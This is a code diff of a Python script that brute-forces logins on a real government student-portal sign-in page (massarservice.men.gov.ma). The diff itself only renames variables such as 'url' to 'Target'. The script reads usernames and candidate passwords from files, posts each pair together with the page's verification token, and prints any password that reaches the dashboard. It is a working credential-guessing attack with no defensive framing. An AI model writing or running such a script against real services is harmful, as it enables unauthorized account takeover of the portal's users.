@@ -2,7 +2,7 @@
 import requests
 from bs4 import BeautifulSoup
 
-url = "https://massarservice.men.gov.ma/moutamadris/Account"
+Target = "https://massarservice.men.gov.ma/moutamadris/Account"
 
 def get_token(source):
     
@@ -12,7 +12,7 @@ def get_token(source):
 
 with requests.Session() as s:
     
-    src = s.get(url).text
+    src = s.get(Target).text
 
     user1 = open("user1.txt","r").read().split()
 
@@ -22,7 +22,7 @@ with requests.Session() as s:
 
         for pass_2 in pass2 :
     
-            creds = {
+            data = {
                             
                 "username" : user_1,
                             
@@ -33,7 +33,7 @@ with requests.Session() as s:
                 "__RequestVerificationToken" : get_token(src),
                             
                     }
-            r = s.post(url, data = creds)
+            r = s.post(Target, data = data)
             
             if "/moutamadris/Dashboard" in r.text :
                 print(user_1,"Find Password :",pass_2)
